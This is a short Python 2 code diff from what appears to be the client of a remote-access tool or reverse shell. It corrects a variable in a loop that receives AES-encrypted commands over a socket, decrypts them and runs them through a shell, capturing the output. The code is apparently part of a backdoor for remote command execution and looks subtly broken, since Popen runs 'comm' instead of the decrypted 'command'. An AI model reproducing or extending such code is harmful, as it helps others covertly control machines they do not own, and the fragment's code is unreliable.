@@ -631,7 +631,7 @@ while True:
             print "\nDecrypted encrypted key"
 
             ecommand = recv_one_message(s)
-            command = AES256.decrypt(ecmd, d_key16)
+            command = AES256.decrypt(ecommand, d_key16)
 
             cmd = subprocess.Popen(comm[:], shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
             output_byte = cmd.stdout.read() + cmd.stderr.read()
